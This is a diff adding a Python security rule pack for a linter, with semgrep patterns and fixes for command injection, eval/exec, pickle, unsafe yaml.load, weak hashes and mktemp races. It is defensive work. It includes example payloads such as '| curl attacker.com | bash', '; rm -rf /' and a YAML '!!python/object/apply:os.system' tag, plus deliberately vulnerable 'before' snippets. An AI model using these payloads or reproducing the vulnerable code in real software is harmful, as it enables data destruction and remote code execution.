@@ -1,0 +1,497 @@
+# yaml-language-server: $schema=../schemas/rule-pack.schema.json
+apiVersion: rules.idiomatic.dev/v1alpha1
+kind: RulePack
+
+pack:
+  id: py-security
+  name: Python Security
+  version: 0.1.0
+  description: >
+    General Python security rules for any Python project. Catches the most
+    common and highest-impact vulnerabilities: command injection via
+    subprocess, arbitrary code execution via eval/exec and pickle, unsafe
+    deserialization via yaml.load, TOCTOU races in tempfile usage, weak
+    cryptographic algorithms, and shell-escape via os.system. These rules
+    complement python-starter's SQL injection rule with broader coverage
+    of the Python security attack surface.
+  maintainer: idiomatic
+  license: Apache-2.0
+  homepage: https://github.com/adamgilman/idiomatic/blob/main/packs/py-security.yaml
+  tags:
+    language: python
+    category: security
+    owasp: [A01, A03, A08]
+
+rules:
+  # ── Command injection ───────────────────────────────────────────
+
+  - id: py-subprocess-shell-true
+    name: subprocess called with shell=True
+    description: >
+      Flags subprocess.run, subprocess.call, subprocess.Popen,
+      subprocess.check_output, and subprocess.check_call when called with
+      shell=True. This passes the command to the system shell, enabling
+      command injection when any part of the command string contains user
+      input.
+    descriptions:
+      business: >
+        shell=True tells Python to hand the command string directly to
+        /bin/sh. If any part of that string comes from user input, an
+        attacker can append ; rm -rf / or | curl attacker.com | bash to
+        the end. This gives an attacker full shell access to the server
+        running your code. This is one of the most common and most
+        devastating vulnerabilities in Python services.
+      developer: >
+        subprocess with shell=True invokes sh -c "your command string".
+        An attacker who controls any part of the command string can break
+        out of the intended command and run arbitrary shell commands. Use
+        shell=False (the default) and pass the command as a list of
+        arguments instead: ["cmd", "--flag", user_input]. This way user
+        input is passed as a literal argument, never interpreted by the shell.
+    rationale: >
+      shell=True is the most common source of command injection in Python.
+      When the subprocess receives user input as part of a shell command
+      string, an attacker can inject shell metacharacters (;, &&, |, $(), ``)
+      to run arbitrary commands. The fix is always the same: pass a list of
+      arguments with shell=False. The OS handles argument passing directly
+      without shell interpretation, making injection impossible regardless
+      of input content. This is OWASP A03:2021 — Injection.
+    severity: error
+    tags: [security, command-injection, owasp]
+    detector:
+      capability: semgrep
+      config:
+        language: python
+        pattern-either:
+          - pattern: subprocess.run(..., shell=True, ...)
+          - pattern: subprocess.call(..., shell=True, ...)
+          - pattern: subprocess.Popen(..., shell=True, ...)
+          - pattern: subprocess.check_output(..., shell=True, ...)
+          - pattern: subprocess.check_call(..., shell=True, ...)
+    applies_to: ["**/*.py"]
+    excludes: ["**/venv/**", "**/.venv/**", "**/site-packages/**"]
+    fix:
+      message: Use shell=False (default) and pass the command as a list of arguments.
+      example: |
+        # Before — command injection via shell=True
+        def run_tool(user_arg):
+            subprocess.run(f"mytool --input {user_arg}", shell=True)
+
+        # After — argument list, no shell interpretation
+        def run_tool(user_arg):
+            subprocess.run(["mytool", "--input", user_arg], shell=False)
+    references:
+      - https://docs.python.org/3/library/subprocess.html#security-considerations
+      - https://owasp.org/www-community/attacks/Command_Injection
+      - https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
+
+  - id: py-os-system
+    name: os.system() used for shell command execution
+    description: >
+      Flags os.system() calls. os.system() passes the command string to
+      the system shell, enabling command injection. It also provides no
+      mechanism to capture output or handle errors — subprocess is
+      strictly better in every respect.
+    descriptions:
+      business: >
+        os.system() is a legacy function that hands a command string directly
+        to the system shell. Any user input in the command string creates a
+        command injection vulnerability. It also has no way to capture output
+        or handle errors gracefully, which means failures are invisible to
+        your application. Use subprocess, which solves both problems.
+      developer: >
+        os.system(cmd) is equivalent to subprocess.run(cmd, shell=True) but
+        without the ability to capture stdout/stderr, check the return code
+        programmatically, or set timeouts. It should not appear in modern
+        Python code — subprocess.run() with shell=False and a list of
+        arguments is the correct replacement. If you need to run a shell
+        pipeline, use subprocess.run(cmd, shell=True, capture_output=True)
+        as a last resort, and ensure no user input is interpolated into cmd.
+    rationale: >
+      os.system() is a holdover from Python 2 that was deprecated in favor
+      of subprocess in Python 2.4. It offers no control over stdin/stdout,
+      no error handling, and passes the command to the shell enabling
+      injection. The Python docs themselves recommend subprocess as the
+      replacement. Every modern Python codebase should use subprocess with
+      explicit argument lists.
+    severity: error
+    tags: [security, command-injection, deprecated]
+    detector:
+      capability: semgrep
+      config:
+        language: python
+        pattern: os.system(...)
+    applies_to: ["**/*.py"]
+    excludes: ["**/venv/**", "**/.venv/**", "**/site-packages/**"]
+    fix:
+      message: Replace os.system() with subprocess.run() and a list of arguments.
+      example: |
+        # Before — no error handling, shell injection risk
+        os.system(f"convert {input_file} output.png")
+
+        # After — explicit args, captures result, no injection
+        subprocess.run(["convert", input_file, "output.png"], check=True)
+    references:
+      - https://docs.python.org/3/library/os.html#os.system
+      - https://docs.python.org/3/library/subprocess.html
+
+  # ── Arbitrary code execution ────────────────────────────────────
+
+  - id: py-eval-usage
+    name: eval() executes arbitrary code
+    description: >
+      Flags any call to eval(). eval() compiles and executes arbitrary Python
+      expressions. If any part of the evaluated string comes from user input
+      or an untrusted source, an attacker can run any Python code in your
+      process with the permissions of the server.
+    descriptions:
+      business: >
+        eval() runs any Python code you give it. If an attacker can influence
+        what gets passed to eval() — even indirectly, through a config file,
+        URL parameter, or database value — they can run arbitrary code on your
+        server. This is a complete server compromise: reading files, exfiltrating
+        data, installing backdoors. Never use eval() on untrusted input.
+      developer: >
+        eval() compiles its argument as a Python expression and executes it in
+        the current scope. Any user-controlled string becomes executable code.
+        Even indirect sources (config files, database values, network responses)
+        are dangerous if an attacker can write to them. Replace eval() with
+        ast.literal_eval() for safe evaluation of Python literals, json.loads()
+        for JSON data, or explicit parsing logic for structured input.
+    rationale: >
+      eval() is one of the most dangerous functions in Python. It executes
+      arbitrary code with the full power of the Python interpreter and the
+      permissions of the running process. There is no safe sandboxing. The
+      correct alternative for literal data (dicts, lists, numbers, strings)
+      is ast.literal_eval(), which only accepts literals and raises ValueError
+      for anything else. For structured data, use json.loads() or a parser.
+      eval() on trusted, fully developer-controlled strings may be
+      acceptable, but those cases are rare enough to warrant a noqa annotation.
+    severity: error
+    tags: [security, code-execution, owasp]
+    detector:
+      capability: semgrep
+      config:
+        language: python
+        pattern: eval(...)
+    applies_to: ["**/*.py"]
+    excludes: ["**/venv/**", "**/.venv/**", "**/site-packages/**", "**/test_*.py", "**/*_test.py"]
+    fix:
+      message: Use ast.literal_eval() for Python literals, json.loads() for JSON, or explicit parsing for structured input.
+      example: |
+        # Before — arbitrary code execution
+        def load_config(config_str):
+            return eval(config_str)
+
+        # After — safe literal evaluation
+        import ast
+        def load_config(config_str):
+            return ast.literal_eval(config_str)
+    references:
+      - https://docs.python.org/3/library/functions.html#eval
+      - https://docs.python.org/3/library/ast.html#ast.literal_eval
+      - https://owasp.org/www-community/attacks/Code_Injection
+
+  - id: py-exec-usage
+    name: exec() executes arbitrary statements
+    description: >
+      Flags any call to exec(). exec() is eval()'s more powerful sibling —
+      it executes arbitrary Python statements (not just expressions), giving
+      an attacker full control over the running process.
+    descriptions:
+      business: >
+        exec() is eval() with no restrictions — it can run any Python
+        statement, including imports, class definitions, and arbitrary
+        function calls. If an attacker controls what exec() receives,
+        they own the server. There is almost no legitimate reason to use
+        exec() in application code. The few valid use cases (dynamic code
+        generation, REPLs) should be explicitly justified in comments.
+      developer: >
+        exec() executes a string as Python code, supporting full statement
+        syntax (not just expressions like eval()). This means an attacker can
+        import modules, define classes, modify globals, and call any function.
+        Replace exec() with proper abstractions: importlib.import_module() for
+        dynamic imports, dataclasses or protocols for dynamic class creation,
+        or explicit branching for dynamic dispatch.
+    rationale: >
+      exec() provides the attacker with a Python shell inside your process.
+      Unlike eval(), which is limited to expressions, exec() accepts full
+      Python programs. There is virtually no legitimate use in application
+      code that cannot be replaced by a safer abstraction. The presence of
+      exec() in a codebase warrants careful review of the surrounding code
+      to understand the call site's exposure to untrusted input.
+    severity: error
+    tags: [security, code-execution, owasp]
+    detector:
+      capability: semgrep
+      config:
+        language: python
+        pattern: exec(...)
+    applies_to: ["**/*.py"]
+    excludes: ["**/venv/**", "**/.venv/**", "**/site-packages/**", "**/test_*.py", "**/*_test.py"]
+    fix:
+      message: Replace exec() with importlib.import_module(), explicit class definitions, or structured dispatch.
+      example: |
+        # Before — executing dynamic code
+        exec(f"from {module_name} import {class_name}")
+
+        # After — explicit dynamic import
+        import importlib
+        module = importlib.import_module(module_name)
+        cls = getattr(module, class_name)
+    references:
+      - https://docs.python.org/3/library/functions.html#exec
+      - https://docs.python.org/3/library/importlib.html
+
+  # ── Unsafe deserialization ──────────────────────────────────────
+
+  - id: py-pickle-deserialization
+    name: pickle.loads() or pickle.load() deserializes untrusted data
+    description: >
+      Flags calls to pickle.loads(), pickle.load(), cPickle.loads(), and
+      cPickle.load(). Python pickle format allows arbitrary code execution
+      during deserialization — any data source that an attacker can influence
+      becomes a remote code execution vector.
+    descriptions:
+      business: >
+        Python's pickle format can execute arbitrary code when loading data.
+        An attacker who can inject a malicious pickle — through a compromised
+        database, a tampered cache, a man-in-the-middle on a network call,
+        or a malicious file upload — gets full code execution on your server.
+        This has been exploited in real attacks against machine learning
+        systems and caches. Never load pickle data from untrusted sources.
+      developer: >
+        The pickle protocol includes REDUCE opcodes that call arbitrary Python
+        callables during deserialization. A malicious pickle executes attacker-
+        controlled code before you can inspect the deserialized object. Replace
+        pickle with JSON (json.loads) for simple data, msgpack for performance,
+        or protocol buffers / avro for typed structured data. If pickle is
+        required for compatibility (numpy arrays, ML models), ensure the source
+        is cryptographically authenticated before loading.
+    rationale: >
+      Python's own documentation states: "The pickle module is not secure.
+      Only unpickle data you trust." Unlike JSON, pickle is not a data format
+      — it is a serialized program that runs when you deserialize it. This is
+      not theoretical: CVEs exploiting pickle have appeared in Django, PyYAML,
+      scikit-learn, and others. Use JSON for interop, msgpack for performance,
+      or sign+verify pickle files when compatibility forces their use.
+    severity: error
+    tags: [security, deserialization, owasp]
+    detector:
+      capability: semgrep
+      config:
+        language: python
+        pattern-either:
+          - pattern: pickle.loads(...)
+          - pattern: pickle.load(...)
+          - pattern: cPickle.loads(...)
+          - pattern: cPickle.load(...)
+    applies_to: ["**/*.py"]
+    excludes: ["**/venv/**", "**/.venv/**", "**/site-packages/**"]
+    fix:
+      message: Replace pickle with json.loads() for data, or sign+verify before loading if pickle is unavoidable.
+      example: |
+        # Before — arbitrary code execution on load
+        def load_session(data: bytes) -> dict:
+            return pickle.loads(data)
+
+        # After — safe JSON deserialization
+        import json
+        def load_session(data: bytes) -> dict:
+            return json.loads(data.decode())
+    references:
+      - https://docs.python.org/3/library/pickle.html#module-pickle
+      - https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data
+      - https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
+
+  - id: py-yaml-unsafe-load
+    name: yaml.load() without SafeLoader allows arbitrary code execution
+    description: >
+      Flags yaml.load() calls that do not explicitly pass Loader=yaml.SafeLoader
+      or Loader=yaml.CSafeLoader. The default YAML loader executes Python
+      objects embedded in YAML documents, enabling code execution from
+      malicious YAML input.
+    descriptions:
+      business: >
+        YAML supports embedding Python objects in documents using !! tags.
+        A malicious YAML file containing !!python/object/apply:os.system ["rm -rf /"]
+        executes that command when loaded with the default yaml.load(). Any
+        YAML from an untrusted source — a user upload, a git submodule, a
+        config fetched from the network — is a potential remote code execution
+        vector when loaded this way.
+      developer: >
+        yaml.load() with the default FullLoader or without a Loader can
+        deserialize arbitrary Python objects via YAML tags (!!python/object/apply:).
+        Always use yaml.safe_load() or yaml.load(data, Loader=yaml.SafeLoader)
+        which only deserializes basic YAML types (strings, numbers, dicts,
+        lists, booleans, null). If you need to deserialize custom objects,
+        define a custom SafeLoader subclass with only the constructors you trust.
+    rationale: >
+      PyYAML's default loaders (FullLoader, UnsafeLoader, Loader) support YAML
+      tags that construct arbitrary Python objects. The CVE-2017-18342 class of
+      vulnerabilities exploits this to achieve remote code execution via YAML
+      injection. yaml.safe_load() restricts deserialization to standard YAML
+      scalars and collections, making injection impossible. This is now the
+      recommended API and the PyYAML maintainers have deprecated the unsafe
+      default behavior.
+    severity: error
+    tags: [security, deserialization, yaml]
+    detector:
+      capability: semgrep
+      config:
+        language: python
+        patterns:
+          - pattern: yaml.load(...)
+          - pattern-not: yaml.load(..., Loader=yaml.SafeLoader)
+          - pattern-not: yaml.load(..., Loader=yaml.CSafeLoader)
+          - pattern-not: yaml.load(..., Loader=yaml.BaseLoader)
+    applies_to: ["**/*.py"]
+    excludes: ["**/venv/**", "**/.venv/**", "**/site-packages/**"]
+    fix:
+      message: Use yaml.safe_load() or pass Loader=yaml.SafeLoader explicitly.
+      example: |
+        # Before — executes Python objects in YAML
+        config = yaml.load(config_file)
+
+        # After — only deserializes safe YAML types
+        config = yaml.safe_load(config_file)
+        # or equivalently:
+        config = yaml.load(config_file, Loader=yaml.SafeLoader)
+    references:
+      - https://pyyaml.org/wiki/PyYAMLDocumentation
+      - https://nvd.nist.gov/vuln/detail/CVE-2017-18342
+      - https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
+
+  # ── Cryptographic weaknesses ────────────────────────────────────
+
+  - id: py-weak-hash-algorithm
+    name: Weak cryptographic hash algorithm (MD5 or SHA-1)
+    description: >
+      Flags use of hashlib.md5() and hashlib.sha1(). Both algorithms are
+      cryptographically broken — MD5 since 1996, SHA-1 since 2017 — and
+      must not be used for security-sensitive purposes such as password
+      storage, digital signatures, certificate hashing, or data integrity
+      verification.
+    descriptions:
+      business: >
+        MD5 and SHA-1 are broken cryptographic hash functions. Attackers
+        can generate collisions (two different inputs with the same hash)
+        cheaply, and MD5 preimage attacks are practical with modern GPU
+        hardware. Using these algorithms for password storage, content
+        verification, or digital signatures provides a false sense of
+        security. The fix is to use SHA-256 or SHA-3 for general hashing,
+        and bcrypt, argon2, or scrypt for passwords.
+      developer: >
+        MD5 has been considered broken since at least 2004 (practical
+        collisions demonstrated), and SHA-1 was officially broken in 2017
+        (SHAttered attack). Neither should be used for any security-sensitive
+        purpose. Use hashlib.sha256() or hashlib.sha3_256() for general
+        integrity hashing, and a dedicated password hashing library (bcrypt,
+        argon2-cffi, or passlib) for password storage. If you need MD5/SHA1
+        for compatibility with a non-security protocol (e.g. cache key
+        generation), add # noqa with a comment explaining the non-security use.
+    rationale: >
+      MD5 and SHA-1 are collision-vulnerable: an attacker can construct two
+      different documents with the same hash. This breaks digital signatures,
+      certificate chains, and any system that relies on hash uniqueness for
+      security. For passwords, these algorithms are additionally vulnerable
+      to GPU-accelerated brute force at billions of guesses per second. The
+      NIST deprecated SHA-1 for all security use in 2011. SHA-256 and SHA-3
+      are the correct modern replacements.
+    severity: error
+    tags: [security, cryptography, owasp]
+    detector:
+      capability: semgrep
+      config:
+        language: python
+        pattern-either:
+          - pattern: hashlib.md5(...)
+          - pattern: hashlib.sha1(...)
+    applies_to: ["**/*.py"]
+    excludes: ["**/venv/**", "**/.venv/**", "**/site-packages/**"]
+    fix:
+      message: Use hashlib.sha256() or hashlib.sha3_256() for integrity hashing. Use bcrypt or argon2 for passwords.
+      example: |
+        # Before — cryptographically broken
+        digest = hashlib.md5(data).hexdigest()
+        sig = hashlib.sha1(content).digest()
+
+        # After — cryptographically strong
+        digest = hashlib.sha256(data).hexdigest()
+        sig = hashlib.sha3_256(content).digest()
+
+        # For passwords — use a dedicated library
+        # pip install argon2-cffi
+        from argon2 import PasswordHasher
+        ph = PasswordHasher()
+        hash = ph.hash(password)
+    references:
+      - https://docs.python.org/3/library/hashlib.html
+      - https://nvd.nist.gov/vuln/detail/CVE-2004-2761
+      - https://shattered.io/
+
+  # ── Insecure temp files ─────────────────────────────────────────
+
+  - id: py-tempfile-mktemp
+    name: tempfile.mktemp() has a TOCTOU race condition
+    description: >
+      Flags use of tempfile.mktemp(). mktemp() returns a filename without
+      creating the file, creating a time-of-check/time-of-use (TOCTOU) race
+      condition where an attacker can create a file at the returned path
+      between the check and the use.
+    descriptions:
+      business: >
+        mktemp() returns a filename but does not create the file. The time
+        between getting the filename and opening it is a window where a
+        malicious process can create a file at that path — potentially a
+        symlink to a sensitive system file. When your code then opens the
+        "temp file," it's actually writing to /etc/passwd or similar. Use
+        mkstemp() which atomically creates and returns both a file descriptor
+        and path.
+      developer: >
+        tempfile.mktemp() is deprecated because it is inherently racy: between
+        mktemp() returning the name and your code opening the file, another
+        process can create a file there (or a symlink). The secure alternatives
+        are: tempfile.mkstemp() which atomically creates the file and returns
+        a file descriptor, tempfile.NamedTemporaryFile() for a context-managed
+        temp file, or tempfile.TemporaryDirectory() for a temp directory.
+    rationale: >
+      TOCTOU (time-of-check/time-of-use) races in tempfile handling have been
+      exploited in privilege escalation attacks since the 1990s. mktemp()
+      returns a path without holding any lock on it — between the return and
+      the caller opening the file, an attacker (or another process) can create
+      a symlink there pointing to a sensitive file. Python's own documentation
+      says "Use of this function may introduce a security hole in your program"
+      and "Deprecated since 3.0."
+    severity: warning
+    tags: [security, toctou, filesystem]
+    detector:
+      capability: semgrep
+      config:
+        language: python
+        pattern: tempfile.mktemp(...)
+    applies_to: ["**/*.py"]
+    excludes: ["**/venv/**", "**/.venv/**", "**/site-packages/**"]
+    fix:
+      message: Use tempfile.mkstemp() for atomic creation or tempfile.NamedTemporaryFile() for context management.
+      example: |
+        # Before — TOCTOU race: file does not exist yet after mktemp()
+        path = tempfile.mktemp(suffix=".json")
+        with open(path, "w") as f:
+            json.dump(data, f)
+
+        # After — atomic: mkstemp() creates and opens the file atomically
+        fd, path = tempfile.mkstemp(suffix=".json")
+        try:
+            with os.fdopen(fd, "w") as f:
+                json.dump(data, f)
+        finally:
+            os.unlink(path)
+
+        # Or even simpler
+        with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False) as f:
+            json.dump(data, f)
+            path = f.name
+    references:
+      - https://docs.python.org/3/library/tempfile.html#tempfile.mktemp
+      - https://cwe.mitre.org/data/definitions/377.html
